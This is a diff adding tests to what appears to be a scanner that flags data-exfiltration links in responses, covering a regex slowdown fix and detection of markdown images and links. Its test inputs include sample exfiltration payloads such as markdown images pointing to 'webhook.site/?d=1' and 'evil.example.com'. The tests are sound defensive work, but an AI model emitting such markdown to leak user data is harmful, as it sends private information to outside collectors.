@@ -121,6 +121,64 @@ describe('scanResponseExfil', () => {
     expect(scanResponseExfil('', isExfil)).toHaveLength(0)
   })
 
+  // GHSA-ggrw-cm2f-mh3c: the markdown patterns restarted at every bracket and
+  // ran to the end of the text when the markup never closed. Each size must
+  // cost about twice the one before: an absolute limit passes at a size too
+  // small to show the square, and fails on a loaded machine.
+  describe('markdown stays linear', () => {
+    const fillers = ['![', '[', '[a](//x', '![a](//x', '](//x', '](', '![a](', '](<', '](//x ', '[a](//x "', '![]', '[]('] as const
+    const timed = (text: string) => {
+      const started = performance.now()
+      scanResponseExfil(text, isExfil)
+      return performance.now() - started
+    }
+    for (const wrap of ['raw', 'json'] as const) {
+      for (const filler of fillers) {
+        it(`${wrap}: ${filler}`, () => {
+          const at = (kb: number) => {
+            const text = filler.repeat(Math.ceil((kb * 1024) / filler.length))
+            return wrap === 'raw' ? text : JSON.stringify({ text })
+          }
+          timed(at(200))
+          const small = timed(at(200))
+          const large = timed(at(800))
+          // Twice the room a linear scan needs, and a floor for timer noise.
+          expect(large, `${filler}: ${small} ms at 200 KB, ${large} ms at 800 KB`).toBeLessThan(small * 4 * 2 + 150)
+          expect(large, filler).toBeLessThan(1000)
+        })
+      }
+    }
+  })
+
+  // The bracket text and the destination are read separately, so these must
+  // still be found the way the patterns found them.
+  describe('markdown destinations', () => {
+    it('labels each form by what a client does with it', () => {
+      const kinds = (t: string) => scanResponseExfil(t, isExfil).map(f => f.kind)
+      expect(kinds('![a](https://webhook.site/?d=1)')).toEqual(['markdown-image'])
+      expect(kinds('[a](https://webhook.site/?d=1)')).toEqual(['markdown-link'])
+      expect(kinds('[![a](https://webhook.site/?d=1)](https://evil.example.com/x)')).toEqual(['markdown-image', 'markdown-link'])
+      expect(kinds('![a [nested] b](https://webhook.site/?d=1)')).toEqual(['markdown-image'])
+    })
+
+    it('reads titles, angle brackets and spaces around the destination', () => {
+      for (const t of [
+        '![a]( https://webhook.site/?d=1 )',
+        '![a](<https://webhook.site/?d=1>)',
+        '![a](https://webhook.site/?d=1 "title")',
+        '![a](<https://webhook.site/?d=1> "title")',
+      ]) expect(scanResponseExfil(t, isExfil).map(f => f.url), t).toEqual(['https://webhook.site/?d=1'])
+    })
+
+    it('judges a destination nested inside one that never closes', () => {
+      expect(scanResponseExfil('[a](https://ok.example.com/[b](https://webhook.site/?d=1', isExfil).map(f => f.url)).toContain('https://webhook.site/?d=1')
+    })
+
+    it('reports nothing for an allowed host, a relative link or prose brackets', () => {
+      expect(scanResponseExfil('[a](https://ok.example.com/) ![b](./x.png) items[0](call) [c] (https://webhook.site)', isExfil)).toEqual([])
+    })
+  })
+
   // GHSA-983r-9gmc-f3xr: the <img> pattern's lazy attribute scan restarted at
   // every `<img` and ran to the end of the text when no URL followed, so 400 KB
   // of `<img src="` took 10.5 s on the request thread. Each tag is now read once.
